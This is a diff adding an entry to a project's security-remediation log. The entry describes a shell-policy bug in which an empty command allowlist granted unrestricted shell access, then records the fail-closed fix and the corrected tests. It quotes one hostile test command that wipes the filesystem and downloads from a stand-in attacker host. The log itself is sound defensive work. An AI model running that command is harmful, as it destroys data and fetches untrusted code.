@@ -62,6 +62,48 @@ requirement — do not overwrite, append new entries as work continues.
   below — the DM-pairing approval flow had the *identical* bug pattern,
   confirmed and fixed in the same session.
 
+### SR-1.8 — Shell default deny
+
+- **Status: fixed.**
+- **Reachability found:** live and confirmed by a pre-existing test
+  that literally asserted the vulnerable behavior as correct:
+  `tests/policy/test_shell.py::TestCompoundCommands::test_empty_allowlist_allows_compound`
+  asserted that `engine.check_command("rm -rf / && wget evil.com")`
+  returned `True` under `ShellPolicy(enabled=True, allowed_commands=[])`.
+  `missy/policy/shell.py::ShellPolicyEngine.check_command()` had an
+  explicit code comment: *"Empty allowed_commands means allow-all (shell
+  is unrestricted when enabled)."* This directly contradicted
+  `ShellPolicy.allowed_commands`'s own docstring in
+  `missy/config/settings.py` ("An empty list means no commands are
+  allowed even when enabled is True") and the operator-facing docs in
+  `docs/configuration.md`/`docs/security.md`/`docs/troubleshooting.md`,
+  all three of which already correctly documented the safe (deny-all)
+  behavior. The implementation alone had inverted its own documented
+  contract — any deployment with `shell.enabled: true` and no
+  `allowed_commands` configured (a very easy misconfiguration to reach:
+  it's the literal default value of an empty list) got **unrestricted
+  host shell access**, not the fail-closed default every other artifact
+  promised.
+- **Remediation evidence:** `check_command()` now raises
+  `PolicyViolationError` when `allowed_commands` is empty, matching the
+  documented contract exactly (implementation, docstring, and docs are
+  now aligned — none needed to change except the code). Fixed 4
+  pre-existing tests that had encoded the vulnerable behavior as
+  expected (`tests/policy/test_shell.py` ×2,
+  `tests/unit/test_shell_policy_compound_commands.py`,
+  `tests/integration/test_end_to_end.py`) to assert the correct
+  fail-closed behavior instead, and added a new test in
+  `tests/integration/test_end_to_end.py` explicitly covering the
+  empty-allowlist-denies case alongside the pre-existing
+  explicit-allowlist-permits case. Full suite (20755 tests) green after
+  the change with no other hidden dependencies on the old behavior
+  found.
+- **Residual risk:** none identified for this specific finding — the
+  fix is a straightforward, complete alignment of implementation to an
+  already-correct documented contract. SR-1.7 (shell side-channel
+  closure — command structure beyond `argv[0]`, launcher/delegation
+  mechanisms) is separate, related, and not addressed this session.
+
 ### SR-1.12 — Authenticated Discord pairing
 
 - **Status: fixed (self-approval and any in-band DM approval closed).**
